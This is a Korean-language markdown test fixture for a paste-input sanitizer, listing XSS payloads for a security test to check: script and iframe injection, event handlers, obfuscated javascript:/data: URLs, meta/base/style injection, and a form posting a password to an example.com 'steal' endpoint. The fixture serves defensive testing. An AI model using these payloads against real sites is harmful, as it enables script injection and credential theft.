# 붙여넣기 자료 XSS 픽스처

v2에서 사용자가 붙여넣는 자료는 신뢰할 수 없다. 어디서 복사해 왔는지 알 수 없고,
미리보기가 그것을 렌더링한다. 이 파일은 `pnpm test:security`가 매번 실제 살균
파이프라인에 통과시키는 공격 표면이다. (v2 제품정의 §8 INV-05)

**여기서 페이로드를 빼지 않는다.** 스크립트가 필수 페이로드 목록을 따로 들고
있어서, 정리하다 빼면 게이트가 텅 빈 채로 통과하는 대신 실패한다.

## 태그 주입

<script>alert('script')</script>

</script><script>alert('조기 종료')</script>

<iframe srcdoc="<script>alert('srcdoc')</script>"></iframe>

<object data="javascript:alert(1)"></object>

<embed src="javascript:alert(1)">

<svg onload="alert('svg')"><circle r="10" /></svg>

<math><mtext><script>alert('math')</script></mtext></math>

## 이벤트 핸들러

<img src="x" onerror="alert('onerror')">

<div onmouseover="alert('onmouseover')">마우스를 올려 보세요</div>

<a href="#" onclick="alert('onclick')">클릭</a>

<body onload="alert('onload')">

## 위험한 URL

[javascript 링크](<javascript:alert('link')>)

[vbscript 링크](<vbscript:msgbox('link')>)

[data:text/html 링크](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)

![data:image/svg 이미지](<data:image/svg+xml,%3Csvg%20onload%3Dalert(1)%3E%3C%2Fsvg%3E>)

<a href="JaVaScRiPt:alert('대소문자')">대소문자 섞기</a>

<a href="&#106;avascript:alert('엔티티')">엔티티 인코딩</a>

## 스타일과 메타

<style>body { display: none }</style>

<meta http-equiv="refresh" content="0;url=https://example.com">

<base href="https://example.com/">

<link rel="stylesheet" href="https://example.com/evil.css">

<div style="background:url(javascript:alert(1))">인라인 스타일</div>

## 폼

<form action="https://example.com/steal"><input name="password" type="password"><button>보내기</button></form>

## 정상 내용 (살아남아야 한다)

이 문단은 **굵게**와 _기울임_, `인라인 코드`를 담고 있고 그대로 남아야 한다.

- 목록 항목
- [x] 완료한 작업
- [ ] 남은 작업

| 항목 | 값  |
| ---- | --- |
| 하나 | 1   |

[정상 링크](https://example.com/docs)

```js
// 코드 블록 안의 이것은 텍스트지 스크립트가 아니다.
const evil = '<script>alert(1)</script>';
```

> 인용문도 남는다.
